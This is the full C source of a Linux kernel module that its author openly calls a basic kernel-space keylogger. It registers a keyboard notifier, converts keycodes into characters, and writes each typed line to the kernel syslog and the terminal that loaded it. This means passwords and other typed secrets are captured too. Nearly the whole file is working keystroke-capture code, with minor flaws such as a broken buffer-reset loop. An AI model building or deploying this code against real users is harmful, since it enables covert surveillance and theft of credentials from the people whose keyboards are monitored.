/* IO.C ==================================================================== */
// @desc	Kernel function that accepts and displays user input;
//			takes the form of a basic kernel space keylogger.
//			Supports all ASCII characters and shift modifier; does NOT 
//			(currently) support use of arrow keys. 
//
// @author	Jon Stoecker <jws527@gmail.com>
// @date	4/7/2012
//
// Tested with GCC 4.6.1 in Ubuntu Linux 11.10 / kernel version 3.0.0-17
/* ========================================================================= */

#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/moduleparam.h>
#include <linux/keyboard.h>
#include <linux/init.h>
#include <linux/stat.h>
#include <linux/slab.h>
#include <linux/sched.h>
#include <linux/version.h>
#include <linux/tty.h>

/*
 *	Definitions	
 */
#define AUTHOR "Jonathan Stoecker <jon.stoecker@gmail.com>"
#define DESC "Reads and parses keyboard input and outputs to syslog and term."
#define VERSION "1.0"
#define LICENSE "GPL"
#define WELCOME_MSG1 "Input/output module loaded."
#define WELCOME_MSG2 "For best results, use a separate terminal window."
//#define DEBUG

#define BUF_MAX_SIZE 512	// Maximum buffer size 

#define SUBMIT_KEY ENTER	// Key to submit buffer to output 
#define BACKSPACE 14
#define ENTER 28
#define LSHIFT 42 
#define RSHIFT 54
#define LCTRL 29
#define RCTRL 97
#define LALT 56
#define RALT 100
#define SHIFT 1
#define NONE 0
#define true 1 
#define false 0

MODULE_AUTHOR(AUTHOR);
MODULE_DESCRIPTION(DESC);
MODULE_VERSION(VERSION);
MODULE_LICENSE(LICENSE);

/*
 *	Prototypes
 */
static char key_mapper(int, int);
static void print_tty(char*); 

/*
 *	Parameters
 */
static char* input = NULL;			// Holds input string parameter
module_param(input, charp, 0000);
MODULE_PARM_DESC(input, "  User's command line input.");
static bool term_out = true;		// Condition for term output
module_param(term_out, bool, 0000);
MODULE_PARM_DESC(term_out, "  Terminal output setting.");

static char* buffer;				// Buffer for output
static int bufSize = 0;				// Current buffer size	
static struct tty_struct* tty;      // Pointer to tty for output

/*
 *	Notification handler: accepts keycodes from notifier, sends for
 *	ASCII mapping, buffers, and writes to log/file/stdout when appropriate 
 */
int handler 
(struct notifier_block* nblk, unsigned long kbCode, void* _param)
{
	struct keyboard_notifier_param* knp = _param;
	char c;
	int i;

	/*
	 *	Determine first if the values passed in correspond to a valid
	 *	keycode, then check for terminator key (e.g. enter), 
	 *	backspace key (for erasing the buffer), and finally map the key
	 *	and add to the buffer 
	 */
	if (kbCode == KBD_KEYCODE) {
		// If terminator is pressed, buffer is ready for display
		if(knp->value == SUBMIT_KEY && knp->down && bufSize > 0) {
			// Set the null terminator, send for display/logging...
			buffer[bufSize] = '\0';
			printk(KERN_INFO "IPT: input: %s\n", buffer);
			if (term_out == true) {
                print_tty(" ");
            	print_tty(buffer);
            }
			// ...and reset the buffer
			for (i = 0; i < bufSize; ++i)
				buffer[bufSize] = '\0';
			bufSize = 0;
		}
		// In accordance with user input, erase unwanted chars from buffer
		else if(knp->value == BACKSPACE && knp->down) {
			if (bufSize != 0) {
				--bufSize;
			}
			buffer[bufSize] = '\0';
		}
		// Otherwise, map the keycode and insert the appropriate char 
		// into the buffer as usual
		else if(knp->down && 
			   (knp->value != LSHIFT && knp->value != RSHIFT) &&
			   (knp->value != LCTRL && knp->value != RCTRL) && 
			   (knp->value != LALT && knp->value != RALT)) {
			if(bufSize != BUF_MAX_SIZE - 2) {
				c = key_mapper(knp->value, knp->shift);
				buffer[bufSize] = c;
				++bufSize;
			}
		}
	}

	return NOTIFY_OK;
}

// This is the custom notifier struct to register with the keyboard driver. 
// Set to call the handler function inside the module 
static struct notifier_block scanner = {.notifier_call = handler};

/*
 *	Keycode Mapper 
 */
static char key_mapper(int keycode, int modifier)
{
	char key;

#ifdef DEBUG
	printk("IPT: debug: %i", keycode);
#endif

	switch(modifier) {
		case NONE:	
			switch(keycode) {
				case 2: key = '1'; break;
				case 3: key = '2'; break;
				case 4: key = '3'; break;
				case 5: key = '4'; break;
				case 6: key = '5'; break;
				case 7: key = '6'; break;
				case 8: key = '7'; break;
				case 9: key = '8'; break;
				case 10: key = '9'; break;
				case 11: key = '0'; break;
				case 12: key = '-'; break;
				case 13: key = '='; break;
				case 15: key = '\t'; break;
				case 16: key = 'q'; break;
				case 17: key = 'w'; break;
				case 18: key = 'e'; break;
				case 19: key = 'r'; break;
				case 20: key = 't'; break;
				case 21: key = 'y'; break;
				case 22: key = 'u'; break;
				case 23: key = 'i'; break;
				case 24: key = 'o'; break;
				case 25: key = 'p'; break;
				case 26: key = '['; break;
				case 27: key = ']'; break;
				case 30: key = 'a'; break;
				case 31: key = 's'; break;
				case 32: key = 'd'; break;
				case 33: key = 'f'; break;
				case 34: key = 'g'; break;
				case 35: key = 'h'; break;
				case 36: key = 'j'; break;
				case 37: key = 'k'; break;
				case 38: key = 'l'; break;
				case 39: key = ';'; break;
				case 40: key = '\''; break;
				case 41: key = '`'; break;
				case 43: key = '\\'; break;
				case 44: key = 'z'; break;
				case 45: key = 'x'; break;
				case 46: key = 'c'; break;
				case 47: key = 'v'; break;
				case 48: key = 'b'; break;
				case 49: key = 'n'; break;
				case 50: key = 'm'; break;
				case 51: key = ','; break;
				case 52: key = '.'; break;
				case 53: key = '/'; break;
				case 57: key = ' '; break;
			} break;
		case SHIFT: 
			switch(keycode) {
				case 2: key = '!'; break;
				case 3: key = '@'; break;
				case 4: key = '#'; break;
				case 5: key = '$'; break;
				case 6: key = '%'; break;
				case 7: key = '^'; break;
				case 8: key = '&'; break;
				case 9: key = '*'; break;
				case 10: key = '('; break;
				case 11: key = ')'; break;
				case 12: key = '_'; break;
				case 13: key = '+'; break;
				case 15: key = '\t'; break;
				case 16: key = 'Q'; break;
				case 17: key = 'W'; break;
				case 18: key = 'E'; break;
				case 19: key = 'R'; break;
				case 20: key = 'T'; break;
				case 21: key = 'Y'; break;
				case 22: key = 'U'; break;
				case 23: key = 'I'; break;
				case 24: key = 'O'; break;
				case 25: key = 'P'; break;
				case 26: key = '{'; break;
				case 27: key = '}'; break;
				case 30: key = 'A'; break;
				case 31: key = 'S'; break;
				case 32: key = 'D'; break;
				case 33: key = 'F'; break;
				case 34: key = 'G'; break;
				case 35: key = 'H'; break;
				case 36: key = 'J'; break;
				case 37: key = 'K'; break;
				case 38: key = 'L'; break;
				case 39: key = ':'; break;
				case 40: key = '\"'; break;
				case 41: key = '~'; break;
				case 43: key = '|'; break;
				case 44: key = 'Z'; break;
				case 45: key = 'X'; break;
				case 46: key = 'C'; break;
				case 47: key = 'V'; break;
				case 48: key = 'B'; break;
				case 49: key = 'N'; break;
				case 50: key = 'M'; break;
				case 51: key = '<'; break;
				case 52: key = '>'; break;
				case 53: key = '?'; break;
				case 57: key = ' '; break;
			} break;
	}

	return key;
}

/*
 *	Terminal output function: passes the string back to the appropriate tty
 */
static void print_tty(char* output)
{
	if (tty != NULL) {
		(((tty->driver)->ops)->write) (tty, output, strlen(output));
		(((tty->driver)->ops)->write) (tty, "\015\012", 2);
	}
	else printk(KERN_DEBUG "tty is null\n");
}

/*
 *	Module initialization function
 */
static int __init kb_scan_init(void)
{
#if ( LINUX_VERSION_CODE <= KERNEL_VERSION(2,6,9) )
	printk(KERN_WARNING "IPT: error: req kernel 2.6.9+.\n");
	tty = current->signal->tty;
	print_tty("IPT: error: req kernel 2.6.9+");
	return -1;
#endif

	// Syslog status (for testing)
	printk(KERN_INFO "IPT: installed.\n");
	if (input)
		printk(KERN_INFO "IPT: parameter input: %s\n", input);
	else
		printk(KERN_INFO "IPT: no parameters.\n");

	// Initialization tasks:
	// 1.) Assign the tty that loaded the module as the output tty
	// 2.) Register the scanner with the keyboard notifier
	// 3.) Allocate the output buffer
	tty = current->signal->tty;
	register_keyboard_notifier(&scanner);
	buffer = kmalloc(BUF_MAX_SIZE * sizeof(char), GFP_KERNEL);

	print_tty(WELCOME_MSG1);
	print_tty(WELCOME_MSG2);

	return 0;
}

/*
 *	Module removal function
 */
static void __exit kb_scan_exit(void)
{
	// Cleanup tasks 
	unregister_keyboard_notifier(&scanner);
	kfree(buffer);

	// Syslog status (for testing)
	printk(KERN_INFO "IPT: removed.\n");
}

module_init(kb_scan_init);
module_exit(kb_scan_exit);
